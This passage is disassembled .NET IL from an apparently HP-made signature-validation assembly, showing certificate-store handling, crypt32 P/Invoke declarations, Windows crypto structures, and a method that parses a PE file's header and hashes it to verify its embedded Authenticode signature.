    IL_0020:  ldtoken    HPValidateSignature.NativeMethods/CERT_INFO
    IL_0025:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_002a:  call       object [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStructure(native int,
                                                                                                 class [mscorlib]System.Type)
    IL_002f:  unbox.any  HPValidateSignature.NativeMethods/CERT_INFO
    IL_0034:  stloc.0
    IL_0035:  ldarg.3
    IL_0036:  brfalse.s  IL_0086

    IL_0038:  ldarg.0
    IL_0039:  ldloc.0
    IL_003a:  ldfld      valuetype HPValidateSignature.NativeMethods/FILETIME HPValidateSignature.NativeMethods/CERT_INFO::NotAfter
    IL_003f:  ldfld      uint32 HPValidateSignature.NativeMethods/FILETIME::dwHighDateTime
    IL_0044:  conv.u8
    IL_0045:  ldc.i4.s   32
    IL_0047:  shl
    IL_0048:  ldloc.0
    IL_0049:  ldfld      valuetype HPValidateSignature.NativeMethods/FILETIME HPValidateSignature.NativeMethods/CERT_INFO::NotAfter
    IL_004e:  ldfld      uint32 HPValidateSignature.NativeMethods/FILETIME::dwLowDateTime
    IL_0053:  conv.u8
    IL_0054:  or
    IL_0055:  call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::FromFileTime(int64)
    IL_005a:  stfld      valuetype [mscorlib]System.DateTime HPValidateSignature.SignedObjectAsn::notAfter
    IL_005f:  ldarg.0
    IL_0060:  ldloc.0
    IL_0061:  ldfld      valuetype HPValidateSignature.NativeMethods/FILETIME HPValidateSignature.NativeMethods/CERT_INFO::NotBefore
    IL_0066:  ldfld      uint32 HPValidateSignature.NativeMethods/FILETIME::dwHighDateTime
    IL_006b:  conv.u8
    IL_006c:  ldc.i4.s   32
    IL_006e:  shl
    IL_006f:  ldloc.0
    IL_0070:  ldfld      valuetype HPValidateSignature.NativeMethods/FILETIME HPValidateSignature.NativeMethods/CERT_INFO::NotAfter
    IL_0075:  ldfld      uint32 HPValidateSignature.NativeMethods/FILETIME::dwLowDateTime
    IL_007a:  conv.u8
    IL_007b:  or
    IL_007c:  call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::FromFileTime(int64)
    IL_0081:  stfld      valuetype [mscorlib]System.DateTime HPValidateSignature.SignedObjectAsn::notBefore
    IL_0086:  ret
  } // end of method SignedObjectAsn::VerifyCertChain

  .method private hidebysig instance bool 
          SetupMemStore(uint8[] cert) cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  6
    .locals init ([0] native int ppCertContext)
    IL_0000:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_000c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0011:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                   native int)
    IL_0016:  brfalse.s  IL_0050

    IL_0018:  ldarg.0
    IL_0019:  ldc.i4.2
    IL_001a:  conv.i8
    IL_001b:  call       native int [mscorlib]System.IntPtr::op_Explicit(int64)
    IL_0020:  ldc.i4.0
    IL_0021:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0026:  ldc.i4     0x2000
    IL_002b:  ldnull
    IL_002c:  call       native int HPValidateSignature.NativeMethods::CertOpenStore(native int,
                                                                                     uint32,
                                                                                     native int,
                                                                                     uint32,
                                                                                     string)
    IL_0031:  stfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_0036:  ldarg.0
    IL_0037:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_003c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0041:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                   native int)
    IL_0046:  brfalse.s  IL_0050

    IL_0048:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::GetLastWin32Error()
    IL_004d:  pop
    IL_004e:  ldc.i4.0
    IL_004f:  ret

    IL_0050:  ldarg.0
    IL_0051:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_0056:  ldc.i4.1
    IL_0057:  ldarg.1
    IL_0058:  ldarg.1
    IL_0059:  ldlen
    IL_005a:  conv.i4
    IL_005b:  ldc.i4.4
    IL_005c:  ldloca.s   ppCertContext
    IL_005e:  call       bool HPValidateSignature.NativeMethods::CertAddEncodedCertificateToStore(native int,
                                                                                                  uint32,
                                                                                                  uint8[],
                                                                                                  uint32,
                                                                                                  uint32,
                                                                                                  native int&)
    IL_0063:  brfalse.s  IL_0067

    IL_0065:  ldc.i4.1
    IL_0066:  ret

    IL_0067:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::GetLastWin32Error()
    IL_006c:  pop
    IL_006d:  ldc.i4.0
    IL_006e:  ret
  } // end of method SignedObjectAsn::SetupMemStore

} // end of class HPValidateSignature.SignedObjectAsn

.class private abstract auto ansi sealed beforefieldinit HPValidateSignature.NativeMethods
       extends [mscorlib]System.Object
{
  .class sequential ansi sealed nested public beforefieldinit CERT_ENHKEY_USAGE
         extends [mscorlib]System.ValueType
  {
    .field public uint32 cUsageIdentifier
    .field private native int rgpszUsageIdentifier
  } // end of class CERT_ENHKEY_USAGE

  .class sequential ansi sealed nested public beforefieldinit CERT_USAGE_MATCH
         extends [mscorlib]System.ValueType
  {
    .field public uint32 dwType
    .field public valuetype HPValidateSignature.NativeMethods/CERT_ENHKEY_USAGE Usage
  } // end of class CERT_USAGE_MATCH

  .class sequential ansi sealed nested public beforefieldinit CERT_CHAIN_PARA
         extends [mscorlib]System.ValueType
  {
    .field public uint32 cbSize
    .field public valuetype HPValidateSignature.NativeMethods/CERT_USAGE_MATCH RequestedUsage
    .field public valuetype HPValidateSignature.NativeMethods/CERT_USAGE_MATCH RequestedIssuancePolicy
    .field public uint32 dwUrlRetrievalTimeout
    .field public  marshal( bool) bool fCheckRevocationFreshnessTime
    .field public native int pftCacheResync
  } // end of class CERT_CHAIN_PARA

  .class sequential ansi sealed nested public beforefieldinit CERT_CONTEXT
         extends [mscorlib]System.ValueType
  {
    .field public uint32 dwCertEncodingType
    .field public native int pbCertEncoded
    .field public uint32 cbCertEncoded
    .field public native int pCertInfo
    .field public native int hCertStore
  } // end of class CERT_CONTEXT

  .class sequential ansi sealed nested public beforefieldinit CERT_INFO
         extends [mscorlib]System.ValueType
  {
    .field public uint32 dwVersion
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_INTEGER_BLOB SerialNumber
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_ALGORITHM_IDENTIFIER SignatureAlgorithm
    .field public valuetype HPValidateSignature.NativeMethods/CERT_NAME_BLOB Issuer
    .field public valuetype HPValidateSignature.NativeMethods/FILETIME NotBefore
    .field public valuetype HPValidateSignature.NativeMethods/FILETIME NotAfter
    .field public valuetype HPValidateSignature.NativeMethods/CERT_NAME_BLOB Subject
    .field public valuetype HPValidateSignature.NativeMethods/CERT_PUBLIC_KEY_INFO SubjectPublicKeyInfo
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_BIT_BLOB IssuerUniqueId
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_BIT_BLOB SubjectUniqueId
    .field public uint32 cExtension
    .field private native int rgExtension
  } // end of class CERT_INFO

  .class sequential ansi sealed nested public beforefieldinit CERT_PUBLIC_KEY_INFO
         extends [mscorlib]System.ValueType
  {
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_ALGORITHM_IDENTIFIER Algorithm
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_BIT_BLOB PublicKey
  } // end of class CERT_PUBLIC_KEY_INFO

  .class sequential ansi sealed nested public beforefieldinit CRYPT_BIT_BLOB
         extends [mscorlib]System.ValueType
  {
    .field public uint32 cbData
    .field public native int pbData
    .field public uint32 cUnusedBits
  } // end of class CRYPT_BIT_BLOB

  .class sequential ansi sealed nested public beforefieldinit CRYPT_INTEGER_BLOB
         extends [mscorlib]System.ValueType
  {
    .field public uint32 cbData
    .field public native int pbData
  } // end of class CRYPT_INTEGER_BLOB

  .class sequential ansi sealed nested public beforefieldinit CERT_NAME_BLOB
         extends [mscorlib]System.ValueType
  {
    .field public uint32 cbData
    .field public native int pbData
  } // end of class CERT_NAME_BLOB

  .class sequential ansi sealed nested public beforefieldinit FILETIME
         extends [mscorlib]System.ValueType
  {
    .field public uint32 dwLowDateTime
    .field public uint32 dwHighDateTime
  } // end of class FILETIME

  .class sequential ansi sealed nested public beforefieldinit CRYPT_ALGORITHM_IDENTIFIER
         extends [mscorlib]System.ValueType
  {
    .field public native int pszObjId
    .field public valuetype HPValidateSignature.NativeMethods/CRYPT_OBJID_BLOB Parameters
  } // end of class CRYPT_ALGORITHM_IDENTIFIER

  .class sequential ansi sealed nested public beforefieldinit CRYPT_OBJID_BLOB
         extends [mscorlib]System.ValueType
  {
    .field public uint32 cbData
    .field public native int pbData
  } // end of class CRYPT_OBJID_BLOB

  .class sequential ansi sealed nested public beforefieldinit PUBKEYBLOBHEADER
         extends [mscorlib]System.ValueType
  {
    .field public uint8 bType
    .field public uint8 bVersion
    .field public int16 reserved
    .field public uint32 aiKeyAlg
    .field public uint32 magic
    .field public uint32 bitlen
    .field public uint32 pubexp
  } // end of class PUBKEYBLOBHEADER

  .field public static literal uint32 CERT_STORE_PROV_SYSTEM = uint32(0x0000000A)
  .field public static literal uint32 X509_ASN_ENCODING = uint32(0x00000001)
  .field public static literal uint32 CERT_STORE_CREATE_NEW_FLAG = uint32(0x00002000)
  .field public static literal uint32 CERT_STORE_PROV_MEMORY = uint32(0x00000002)
  .field public static literal uint32 CERT_STORE_ADD_ALWAYS = uint32(0x00000004)
  .field public static literal uint32 HCCE_LOCAL_MACHINE = uint32(0x00000001)
  .field public static literal uint32 CERT_CHAIN_CACHE_END_CERT = uint32(0x00000001)
  .field public static literal uint32 CERT_TRUST_IS_NOT_TIME_VALID = uint32(0x00000001)
  .field public static literal uint32 PROV_RSA_FULL = uint32(0x00000001)
  .field public static literal uint32 RSA_CSP_PUBLICKEYBLOB = uint32(0x00000013)
  .field public static literal uint32 CRYPT_VERIFYCONTEXT = uint32(0xF0000000)
  .field public static literal uint32 CRYPT_SILENT = uint32(0x00000040)
  .field public static literal uint32 CRYPT_MACHINE_KEYSET = uint32(0x00000020)
  .field public static literal uint32 CALG_RSA_SIGN = uint32(0x00002400)
  .field public static literal string MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0"
  .field public static literal uint32 CERT_STORE_ADD_NEW = uint32(0x00000001)
  .field public static literal uint32 CERT_STORE_ADD_USE_EXISTING = uint32(0x00000002)
  .field public static literal uint32 CERT_STORE_ADD_REPLACE_EXISTING = uint32(0x00000003)
  .field public static literal uint32 CERT_STORE_ADD_REPLACE_EXISTING_INHERIT_PROPERTIES = uint32(0x00000005)
  .field public static literal uint32 CERT_STORE_ADD_NEWER = uint32(0x00000006)
  .field public static literal uint32 CERT_STORE_ADD_NEWER_INHERIT_PROPERTIES = uint32(0x00000007)
  .field public static literal uint32 CERT_STORE_READONLY_FLAG = uint32(0x00008000)
  .field public static literal uint32 CERT_SYSTEM_STORE_CURRENT_USER = uint32(0x00010000)
  .field public static literal uint32 CERT_SYSTEM_STORE_LOCAL_MACHINE = uint32(0x00020000)
  .field public static literal uint32 CERT_HASH_PROP_ID = uint32(0x00000003)
  .method public hidebysig static pinvokeimpl("crypt32.dll" unicode lasterr winapi) 
          native int  CertOpenStore(native int lpszStoreProvider,
                                    uint32 dwMsgAndCertEncodingType,
                                    native int hCryptProv,
                                    uint32 dwFlags,
                                    string pvPara) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          bool  marshal( bool)  CertCloseStore(native int hCertStore,
                                               uint32 dwFlags) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          bool  marshal( bool)  CertAddEncodedCertificateToStore(native int hCertStore,
                                                                 uint32 dwCertEncodingType,
                                                                 uint8[] pbCertEncoded,
                                                                 uint32 cbCertEncoded,
                                                                 uint32 dwAddDisposition,
                                                                 [out] native int& ppCertContext) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          bool  marshal( bool)  CertFreeCertificateContext(native int pCertContext) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          native int  CertEnumCertificatesInStore(native int hCertStore,
                                                  native int pPrevCertContext) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          bool  marshal( bool)  CryptDecodeObjectEx(uint32 dwCertEncodingType,
                                                    uint32 lpszStructType,
                                                    uint8[] pbEncoded,
                                                    uint32 cbEncoded,
                                                    uint32 dwFlags,
                                                    native int pDecodePara,
                                                    [in][out] uint8[] pvStructInfo,
                                                    uint32& pcbStructInfo) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("HP.Common.System.OS.dll" lasterr winapi) 
          uint32 
          marshal( unsigned int32) 
          ValidateCertChain(native int pCertContext,
                            native int hCertStore) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("HP.Common.System.OS.dll" lasterr winapi) 
          native int  ChainRootCert(native int pCertContext,
                                    native int hCertStore) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          bool  marshal( bool)  CertGetCertificateContextProperty(native int pCertContext,
                                                                  uint32 dwPropId,
                                                                  uint8[] pvData,
                                                                  uint32& pcbData) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          native int  CertDuplicateCertificateContext(native int pCertContext) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" lasterr winapi) 
          bool  marshal( bool)  CertAddEncodedCertificateToStore(native int hCertStore,
                                                                 uint32 dwCertEncodingType,
                                                                 uint8[] pbCertEncoded,
                                                                 uint32 cbCertEncoded,
                                                                 uint32 dwAddDisposition,
                                                                 [out] native int ppCertContext) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("crypt32.dll" autochar lasterr winapi) 
          bool  marshal( bool)  CertDeleteCertificateFromStore(native int pCertContext) cil managed preservesig
  {
  }
} // end of class HPValidateSignature.NativeMethods

.class public auto ansi beforefieldinit HPValidateSignature.SignedObject
       extends [mscorlib]System.Object
{
  .field private uint8[] sha1Oid
  .field private uint8[] sha256Oid
  .field private static literal string sha256OidName = "2.16.840.1.101.3.4.2.1"
  .field private static literal int32 authOffset = int32(0x00000098)
  .field private static literal int32 authSizeOffset = int32(0x0000009C)
  .field private static literal int32 checksumOffset = int32(0x00000058)
  .field private static literal int32 blockSize = int32(0x00002000)
  .field private static literal int32 sigSizeMax = int32(0x00010000)
  .method public hidebysig instance valuetype [HP.Common.System]HP.Common.System.Security.SignedObjRet 
          ValidatePeSignature(string fileName) cil managed
  {
    // Code size       465 (0x1d1)
    .maxstack  6
    .locals init ([0] class [mscorlib]System.IO.FileStream file,
             [1] uint8[] numArray1,
             [2] int32 bytesRead,
             [3] int32 int32_1,
             [4] int32 int32_2,
             [5] int32 int32_3,
             [6] int64 position,
             [7] uint8[] numArray2,
             [8] class [HP.Common.System]HP.Common.System.Security.SignedDataIndex inIndex,
             [9] uint8[] numArray3,
             [10] class [mscorlib]System.Security.Cryptography.HashAlgorithm hashAlgorithm,
             [11] valuetype [HP.Common.System]HP.Common.System.Security.SignedObjRet V_11,
             [12] class [mscorlib]System.Security.Cryptography.HashAlgorithm V_12,
             [13] class HPValidateSignature.SignedObjectAsn signedObjectAsn)
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  ldc.i4.3
      IL_0002:  ldc.i4.1
      IL_0003:  ldc.i4.1
      IL_0004:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode,
                                                                               valuetype [mscorlib]System.IO.FileAccess,
                                                                               valuetype [mscorlib]System.IO.FileShare)
      IL_0009:  stloc.0
      .try
      {
        IL_000a:  ldc.i4     0x2000
        IL_000f:  newarr     [mscorlib]System.Byte
        IL_0014:  stloc.1
        IL_0015:  ldloc.0
        IL_0016:  ldloc.1
        IL_0017:  ldc.i4.0
        IL_0018:  ldloc.1
        IL_0019:  ldlen
        IL_001a:  conv.i4
        IL_001b:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(uint8[],
                                                                             int32,
                                                                             int32)
        IL_0020:  stloc.2
        IL_0021:  ldloc.2
        IL_0022:  ldc.i4     0x240
        IL_0027:  blt.s      IL_0037

        IL_0029:  ldc.i4     0x5a4d
        IL_002e:  ldloc.1
        IL_002f:  ldc.i4.0
        IL_0030:  call       uint16 [mscorlib]System.BitConverter::ToUInt16(uint8[],
                                                                            int32)
        IL_0035:  beq.s      IL_0040

        IL_0037:  ldc.i4.s   -2
        IL_0039:  stloc.s    V_11
        IL_003b:  leave      IL_01ce

        IL_0040:  ldloc.1
        IL_0041:  ldc.i4.s   60
        IL_0043:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                          int32)
        IL_0048:  stloc.3
        IL_0049:  ldloc.3
        IL_004a:  ldloc.1
        IL_004b:  ldlen
        IL_004c:  conv.i4
        IL_004d:  bgt.s      IL_005d

        IL_004f:  ldloc.1
        IL_0050:  ldloc.3
        IL_0051:  call       uint32 [mscorlib]System.BitConverter::ToUInt32(uint8[],
                                                                            int32)
        IL_0056:  ldc.i4     0x4550
        IL_005b:  beq.s      IL_0066

        IL_005d:  ldc.i4.s   -2
        IL_005f:  stloc.s    V_11
        IL_0061:  leave      IL_01ce

        IL_0066:  ldloc.1
        IL_0067:  ldloc.3
        IL_0068:  ldc.i4     0x98
        IL_006d:  add
        IL_006e:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                          int32)
        IL_0073:  stloc.s    int32_2
        IL_0075:  ldloc.1
        IL_0076:  ldloc.3
        IL_0077:  ldc.i4     0x9c
        IL_007c:  add
        IL_007d:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                          int32)
        IL_0082:  stloc.s    int32_3
        IL_0084:  ldloc.s    int32_3
        IL_0086:  ldc.i4.8
        IL_0087:  ble.s      IL_00ab

        IL_0089:  ldloc.s    int32_2
        IL_008b:  conv.i8
        IL_008c:  ldloc.0
        IL_008d:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
        IL_0092:  bgt.s      IL_00ab

        IL_0094:  ldloc.s    int32_2
        IL_0096:  ldloc.s    int32_3
        IL_0098:  add
        IL_0099:  conv.i8
        IL_009a:  ldloc.0
        IL_009b:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
        IL_00a0:  bgt.s      IL_00ab

        IL_00a2:  ldloc.s    int32_3
        IL_00a4:  ldc.i4     0x10000
        IL_00a9:  ble.s      IL_00b4

        IL_00ab:  ldc.i4.s   -2
        IL_00ad:  stloc.s    V_11
        IL_00af:  leave      IL_01ce

        IL_00b4:  ldloc.0
        IL_00b5:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Position()
        IL_00ba:  stloc.s    position
        IL_00bc:  ldloc.s    int32_3
        IL_00be:  ldc.i4.8
        IL_00bf:  sub
        IL_00c0:  newarr     [mscorlib]System.Byte
        IL_00c5:  stloc.s    numArray2
        IL_00c7:  ldloc.0
        IL_00c8:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Position()
        IL_00cd:  ldloc.s    int32_2
        IL_00cf:  ldc.i4.8
        IL_00d0:  add
        IL_00d1:  conv.i8
        IL_00d2:  beq.s      IL_00e1

        IL_00d4:  ldloc.0
        IL_00d5:  ldloc.s    int32_2
        IL_00d7:  ldc.i4.8
        IL_00d8:  add
        IL_00d9:  conv.i8
        IL_00da:  ldc.i4.0
        IL_00db:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                             valuetype [mscorlib]System.IO.SeekOrigin)
        IL_00e0:  pop
        IL_00e1:  ldloc.0
        IL_00e2:  ldloc.s    numArray2
        IL_00e4:  ldc.i4.0
        IL_00e5:  ldloc.s    int32_3
        IL_00e7:  ldc.i4.8
        IL_00e8:  sub
        IL_00e9:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(uint8[],
                                                                             int32,
                                                                             int32)
        IL_00ee:  pop
        IL_00ef:  ldloc.s    numArray2
        IL_00f1:  newobj     instance void [HP.Common.System]HP.Common.System.Security.SignedDataIndex::.ctor(uint8[])
        IL_00f6:  stloc.s    inIndex
        IL_00f8:  ldloc.s    inIndex
        IL_00fa:  callvirt   instance bool [HP.Common.System]HP.Common.System.Security.SignedDataIndex::FindTags()
        IL_00ff:  pop
        IL_0100:  ldloc.s    inIndex
        IL_0102:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_SigHashOidLen()
        IL_0107:  conv.ovf.i
        IL_0108:  newarr     [mscorlib]System.Byte
        IL_010d:  stloc.s    numArray3
        IL_010f:  ldloc.s    numArray2
        IL_0111:  ldloc.s    inIndex
        IL_0113:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_SigHashOid()
        IL_0118:  conv.i4
        IL_0119:  ldloc.s    numArray3
        IL_011b:  ldc.i4.0
        IL_011c:  ldloc.s    numArray3
        IL_011e:  ldlen
        IL_011f:  conv.i4
        IL_0120:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                     int32,
                                                                     class [mscorlib]System.Array,
                                                                     int32,
                                                                     int32)
        IL_0125:  ldloc.s    numArray3
        IL_0127:  ldarg.0
        IL_0128:  ldfld      uint8[] HPValidateSignature.SignedObject::sha1Oid
        IL_012d:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                         uint8[])
        IL_0132:  brfalse.s  IL_013b

        IL_0134:  newobj     instance void [mscorlib]System.Security.Cryptography.SHA1CryptoServiceProvider::.ctor()
        IL_0139:  br.s       IL_0156

        IL_013b:  ldloc.s    numArray3
        IL_013d:  ldarg.0
        IL_013e:  ldfld      uint8[] HPValidateSignature.SignedObject::sha256Oid
        IL_0143:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                         uint8[])
        IL_0148:  brfalse.s  IL_0151

        IL_014a:  newobj     instance void [HP.Common.System]HP.Common.System.Security.Cryptography.WinSHA256::.ctor()
        IL_014f:  br.s       IL_0156

        IL_0151:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
        IL_0156:  stloc.s    hashAlgorithm
        IL_0158:  ldloc.s    hashAlgorithm
        IL_015a:  stloc.s    V_12
        .try
        {
          IL_015c:  ldloc.0
          IL_015d:  ldloc.s    position
          IL_015f:  ldc.i4.0
          IL_0160:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                               valuetype [mscorlib]System.IO.SeekOrigin)
          IL_0165:  pop
          IL_0166:  ldloc.0
          IL_0167:  ldloc.s    hashAlgorithm
          IL_0169:  ldloc.1
          IL_016a:  ldloc.3
          IL_016b:  ldloc.s    int32_2
          IL_016d:  ldloc.2
          IL_016e:  call       void HPValidateSignature.SignedObject::PeHash(class [mscorlib]System.IO.FileStream,
                                                                             class [mscorlib]System.Security.Cryptography.HashAlgorithm,
                                                                             uint8[],
                                                                             int32,
                                                                             int32,
                                                                             int32)
          IL_0173:  newobj     instance void HPValidateSignature.SignedObjectAsn::.ctor()
          IL_0178:  stloc.s    signedObjectAsn
          .try
          {
            IL_017a:  ldloc.s    signedObjectAsn
            IL_017c:  ldloc.s    numArray2
            IL_017e:  ldloc.s    hashAlgorithm
            IL_0180:  ldloc.s    inIndex
            IL_0182:  callvirt   instance valuetype [HP.Common.System]HP.Common.System.Security.SignedObjRet HPValidateSignature.SignedObjectAsn::ValidateSignature(uint8[],
                                                                                                                                                                    class [mscorlib]System.Security.Cryptography.HashAlgorithm,
                                                                                                                                                                    class [HP.Common.System]HP.Common.System.Security.SignedDataIndex)
            IL_0187:  stloc.s    V_11
            IL_0189:  leave.s    IL_01ce

          }  // end .try
          finally
          {
            IL_018b:  ldloc.s    signedObjectAsn
            IL_018d:  brfalse.s  IL_0196

            IL_018f:  ldloc.s    signedObjectAsn
            IL_0191:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
            IL_0196:  endfinally
          }  // end handler
        }  // end .try
        finally
        {
          IL_0197:  ldloc.s    V_12
          IL_0199:  brfalse.s  IL_01a2

          IL_019b:  ldloc.s    V_12
          IL_019d:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_01a2:  endfinally
        }  // end handler
      }  // end .try
      finally
      {
        IL_01a3:  ldloc.0
        IL_01a4:  brfalse.s  IL_01ac

        IL_01a6:  ldloc.0
        IL_01a7:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_01ac:  endfinally
      }  // end handler
    }  // end .try
    catch [mscorlib]System.ObjectDisposedException 
    {
      IL_01ad:  pop
      IL_01ae:  ldc.i4.m1
      IL_01af:  stloc.s    V_11
      IL_01b1:  leave.s    IL_01ce

    }  // end handler
    catch [mscorlib]System.InvalidOperationException 
    {
      IL_01b3:  pop
      IL_01b4:  ldc.i4.s   -2
      IL_01b6:  stloc.s    V_11
      IL_01b8:  leave.s    IL_01ce

    }  // end handler
    catch [mscorlib]System.ArgumentException 
    {
      IL_01ba:  pop
      IL_01bb:  ldc.i4.s   -2
      IL_01bd:  stloc.s    V_11
      IL_01bf:  leave.s    IL_01ce

    }  // end handler
    catch [mscorlib]System.IO.IOException 
    {
      IL_01c1:  pop
      IL_01c2:  ldc.i4.s   -2
      IL_01c4:  stloc.s    V_11
      IL_01c6:  leave.s    IL_01ce

    }  // end handler
    catch [mscorlib]System.Runtime.InteropServices.COMException 
    {
      IL_01c8:  pop
      IL_01c9:  ldc.i4.m1
      IL_01ca:  stloc.s    V_11
      IL_01cc:  leave.s    IL_01ce

    }  // end handler
    IL_01ce:  ldloc.s    V_11
    IL_01d0:  ret
  } // end of method SignedObject::ValidatePeSignature

  .method private hidebysig static void  PeHash(class [mscorlib]System.IO.FileStream file,
                                                class [mscorlib]System.Security.Cryptography.HashAlgorithm hash,
                                                uint8[] segment,
                                                int32 peStart,
                                                int32 sigOffset,
                                                int32 bytesRead) cil managed
  {
    // Code size       169 (0xa9)
    .maxstack  7
    .locals init ([0] int32 num1,
             [1] int32 inputCount1,
             [2] int32 num2,
             [3] int32 inputCount2,
             [4] int32 num3,
             [5] int32 num5)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldarg.3
    IL_0003:  ldc.i4.s   88
    IL_0005:  add
    IL_0006:  stloc.1
    IL_0007:  ldarg.1
    IL_0008:  ldarg.2
    IL_0009:  ldloc.0
    IL_000a:  ldloc.1
    IL_000b:  ldarg.2
    IL_000c:  ldloc.0
    IL_000d:  callvirt   instance int32 [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformBlock(uint8[],
                                                                                                             int32,
                                                                                                             int32,
                                                                                                             uint8[],
                                                                                                             int32)
    IL_0012:  pop
    IL_0013:  ldloc.1
    IL_0014:  ldc.i4.4
    IL_0015:  add
    IL_0016:  stloc.2
    IL_0017:  ldloc.1
    IL_0018:  ldc.i4     0x98
    IL_001d:  sub
    IL_001e:  ldc.i4.4
    IL_001f:  sub
    IL_0020:  stloc.3
    IL_0021:  ldarg.1
    IL_0022:  ldarg.2
    IL_0023:  ldloc.2
    IL_0024:  ldloc.3
    IL_0025:  ldarg.2
    IL_0026:  ldloc.2
    IL_0027:  callvirt   instance int32 [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformBlock(uint8[],
                                                                                                             int32,
                                                                                                             int32,
                                                                                                             uint8[],
                                                                                                             int32)
    IL_002c:  pop
    IL_002d:  ldarg.3
    IL_002e:  ldc.i4     0x98
    IL_0033:  add
    IL_0034:  ldc.i4.8
    IL_0035:  add
    IL_0036:  stloc.s    num3
    IL_0038:  ldarg.s    sigOffset
    IL_003a:  ldc.i4     0x2000
    IL_003f:  bgt.s      IL_0051

    IL_0041:  ldarg.1
    IL_0042:  ldarg.2
    IL_0043:  ldloc.s    num3
    IL_0045:  ldarg.s    bytesRead
    IL_0047:  ldloc.s    num3
    IL_0049:  sub
    IL_004a:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformFinalBlock(uint8[],
                                                                                                                    int32,
                                                                                                                    int32)
    IL_004f:  pop
    IL_0050:  ret

    IL_0051:  ldarg.s    sigOffset
    IL_0053:  ldarg.1
    IL_0054:  ldarg.2
    IL_0055:  ldloc.s    num3
    IL_0057:  ldarg.s    bytesRead
    IL_0059:  ldloc.s    num3
    IL_005b:  sub
    IL_005c:  ldarg.2
    IL_005d:  ldloc.s    num3
    IL_005f:  callvirt   instance int32 [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformBlock(uint8[],
                                                                                                             int32,
                                                                                                             int32,
                                                                                                             uint8[],
                                                                                                             int32)
    IL_0064:  pop
    IL_0065:  ldarg.s    bytesRead
    IL_0067:  sub
    IL_0068:  stloc.s    num5
    IL_006a:  br.s       IL_00a3

    IL_006c:  ldarg.0
    IL_006d:  ldarg.2
    IL_006e:  ldc.i4.0
    IL_006f:  ldarg.2
    IL_0070:  ldlen
    IL_0071:  conv.i4
    IL_0072:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(uint8[],
                                                                         int32,
                                                                         int32)
    IL_0077:  starg.s    bytesRead
    IL_0079:  ldloc.s    num5
    IL_007b:  ldc.i4     0x2000
    IL_0080:  bgt.s      IL_008f

